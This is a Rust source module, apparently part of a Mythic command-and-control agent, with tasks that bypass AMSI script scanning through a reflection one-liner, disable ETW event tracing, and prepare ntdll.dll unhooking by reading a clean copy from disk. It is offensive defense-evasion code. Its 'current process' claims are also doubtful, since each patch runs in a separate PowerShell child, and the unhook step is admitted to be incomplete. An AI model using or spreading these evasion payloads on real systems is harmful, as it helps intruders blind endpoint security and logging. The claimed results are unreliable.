use crate::AgentTask;
use crate::mythic_success;
use crate::mythic_error;
use serde::Deserialize;
use std::error::Error;
use std::process::Command;
use std::sync::mpsc;

/// Struct containing the unhook task parameters
#[derive(Deserialize)]
struct UnhookArgs {
    /// DLL to unhook (default: ntdll.dll)
    dll: Option<String>,
}

/// Patch AMSI in the current process to bypass script scanning
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn amsi_patch(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;

    // PowerShell command to patch AMSI
    let ps_cmd = r#"$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)"#;

    // Execute the PowerShell command
    let shell_cmd = Command::new("powershell.exe")
        .arg("-NoProfile")
        .arg("-Command")
        .arg(ps_cmd)
        .output()?;

    // Check the result
    let output = match shell_cmd.status.code() {
        Some(0) => {
            format!("AMSI patched successfully in current process.\n\nStdout:\n{}",
                std::str::from_utf8(&shell_cmd.stdout)?)
        }
        Some(code) => {
            format!("AMSI patch failed with exit code: {}\n\nStderr:\n{}",
                code,
                std::str::from_utf8(&shell_cmd.stderr)?)
        }
        None => "AMSI patch command was killed by signal.".to_string(),
    };

    // Send the result to Mythic
    if shell_cmd.status.success() {
        tx.send(mythic_success!(task.id, output))?;
    } else {
        tx.send(mythic_error!(task.id, output))?;
    }

    Ok(())
}

/// Placeholder for non-Windows systems
#[cfg(not(target_os = "windows"))]
pub fn amsi_patch(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "amsi_patch is only supported on Windows".to_string()))?;
    Ok(())
}

/// Patch ETW to disable event tracing in the current process
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn etw_patch(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;

    // PowerShell command to patch ETW
    let ps_cmd = r#"[Reflection.Assembly]::LoadWithPartialName('System.Core');[Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)"#;

    // Execute the PowerShell command
    let shell_cmd = Command::new("powershell.exe")
        .arg("-NoProfile")
        .arg("-Command")
        .arg(ps_cmd)
        .output()?;

    // Check the result
    let output = match shell_cmd.status.code() {
        Some(0) => {
            format!("ETW patched successfully in current process.\n\nStdout:\n{}",
                std::str::from_utf8(&shell_cmd.stdout)?)
        }
        Some(code) => {
            format!("ETW patch failed with exit code: {}\n\nStderr:\n{}",
                code,
                std::str::from_utf8(&shell_cmd.stderr)?)
        }
        None => "ETW patch command was killed by signal.".to_string(),
    };

    // Send the result to Mythic
    if shell_cmd.status.success() {
        tx.send(mythic_success!(task.id, output))?;
    } else {
        tx.send(mythic_error!(task.id, output))?;
    }

    Ok(())
}

/// Placeholder for non-Windows systems
#[cfg(not(target_os = "windows"))]
pub fn etw_patch(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "etw_patch is only supported on Windows".to_string()))?;
    Ok(())
}

/// Unhook a DLL by reloading a clean copy from disk
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn unhook(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: UnhookArgs = serde_json::from_str(&task.parameters)?;

    let dll_name = args.dll.unwrap_or_else(|| "ntdll.dll".to_string());

    // PowerShell command to read the DLL from disk
    let ps_cmd = format!(
        r#"$dll='{}';$path="C:\Windows\System32\$dll";if (Test-Path $path){{$bytes=[IO.File]::ReadAllBytes($path);Write-Output "Successfully read $($bytes.Length) bytes from $dll. DLL unhook prepared."}}else{{throw "DLL not found: $path"}}"#,
        dll_name
    );

    // Execute the PowerShell command
    let shell_cmd = Command::new("powershell.exe")
        .arg("-NoProfile")
        .arg("-Command")
        .arg(&ps_cmd)
        .output()?;

    // Check the result
    let output = match shell_cmd.status.code() {
        Some(0) => {
            format!("Unhook operation for {} completed.\n\nStdout:\n{}\n\nNote: Full unhooking requires VirtualProtect and memory copy operations, which are planned for a future update.",
                dll_name,
                std::str::from_utf8(&shell_cmd.stdout)?)
        }
        Some(code) => {
            format!("Unhook operation for {} failed with exit code: {}\n\nStderr:\n{}",
                dll_name,
                code,
                std::str::from_utf8(&shell_cmd.stderr)?)
        }
        None => "Unhook command was killed by signal.".to_string(),
    };

    // Send the result to Mythic
    if shell_cmd.status.success() {
        tx.send(mythic_success!(task.id, output))?;
    } else {
        tx.send(mythic_error!(task.id, output))?;
    }

    Ok(())
}

/// Placeholder for non-Windows systems
#[cfg(not(target_os = "windows"))]
pub fn unhook(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "unhook is only supported on Windows".to_string()))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_unhook_args_parsing() {
        let json_args = r#"{"dll": "kernel32.dll"}"#;
        let args: UnhookArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.dll, Some("kernel32.dll".to_string()));
    }

    #[test]
    fn test_unhook_args_default() {
        let json_args = r#"{}"#;
        let args: UnhookArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.dll, None);
    }
}
